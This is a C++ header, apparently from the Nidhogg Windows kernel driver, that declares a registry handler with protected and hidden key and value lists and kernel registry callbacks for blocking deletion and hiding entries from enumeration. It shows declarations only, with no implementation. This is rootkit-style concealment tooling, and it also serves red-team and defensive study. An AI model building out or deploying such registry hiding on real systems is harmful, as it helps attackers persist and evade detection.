#pragma once
#include "pch.h"
#include "IoctlShared.h"
#include "MemoryHelper.h"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "MemoryAllocator.hpp"
#include "ListHelper.hpp"

// Structs
struct RegItem {
	LIST_ENTRY Entry;
	RegItemType Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegistryEntryList {
	SIZE_T Count;
	PushLock Lock;
	PLIST_ENTRY Items;
};

struct RegistryItemsList {
	RegistryEntryList Protected;
	RegistryEntryList Hidden;
};

class RegistryHandler {
private:
	RegistryItemsList keysList;
	RegistryItemsList valuesList;

	_IRQL_requires_max_(APC_LEVEL)
	bool GetNameFromKeyEnumPreInfo(_In_ KEY_INFORMATION_CLASS infoClass, _In_ PVOID information, _Inout_ PUNICODE_STRING keyName);

	_IRQL_requires_max_(APC_LEVEL)
	bool GetNameFromValueEnumPreInfo(_In_ KEY_VALUE_INFORMATION_CLASS infoClass, _In_ PVOID information, _Inout_ PUNICODE_STRING keyName);

	constexpr auto IsValidRegType(_In_ RegItemType regType) const {
		return regType >= RegItemType::ProtectedKey && regType <= RegItemType::HiddenValue;
	}

	constexpr auto IsValidKeyLen(_In_ USHORT keyLen) const {
		return keyLen > 0 && keyLen < REG_KEY_LEN;
	}

	constexpr auto IsValidValueLen(_In_ USHORT valueLen) const {
		return valueLen > 0 && valueLen < REG_VALUE_LEN;
	}

	_IRQL_requires_max_(APC_LEVEL)
	bool FindRegItem(_In_ const IoctlRegItem& item, _In_ bool partial = false) const;

	_IRQL_requires_(PASSIVE_LEVEL)
	bool GetKeyObject(_In_ PVOID infoObject, _Inout_ PCUNICODE_STRING* keyPath);

public:
	LARGE_INTEGER regCookie;

	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool IsValidKey(_In_ const UNICODE_STRING* key) const;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool IsValidKey(_In_ const wchar_t* key) const;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool IsValidValue(_In_ const UNICODE_STRING* value) const;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool IsValidValue(_In_ const wchar_t* value) const;

	_IRQL_requires_max_(APC_LEVEL)
	RegistryHandler();

	_IRQL_requires_same_
	_IRQL_requires_(PASSIVE_LEVEL)
	~RegistryHandler();

	_IRQL_requires_max_(APC_LEVEL)
	bool AddRegItem(_In_ const IoctlRegItem& item);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveRegItem(_In_ const IoctlRegItem& item);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearRegistryList(_In_ RegItemType registryItemType);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListRegistryItems(_Inout_ IoctlRegistryList* list);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreDeleteKeyHandler(_Inout_ REG_DELETE_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreDeleteValueKeyHandler(_Inout_ REG_DELETE_VALUE_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreQueryKeyHandler(_Inout_ REG_QUERY_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreQueryValueKeyHandler(_Inout_ REG_QUERY_VALUE_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreQueryMultipleValueKeyHandler(_Inout_ REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPreSetValueKeyHandler(_Inout_ REG_SET_VALUE_KEY_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPostEnumerateKeyHandler(_Inout_ REG_POST_OPERATION_INFORMATION* info);

	_IRQL_requires_max_(PASSIVE_LEVEL)
	NTSTATUS RegNtPostEnumerateValueKeyHandler(_Inout_ REG_POST_OPERATION_INFORMATION* info);
};

inline RegistryHandler* NidhoggRegistryHandler;

_IRQL_requires_same_
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS OnRegistryNotify(_In_ PVOID context, _In_opt_ PVOID arg1, _In_opt_ PVOID arg2);
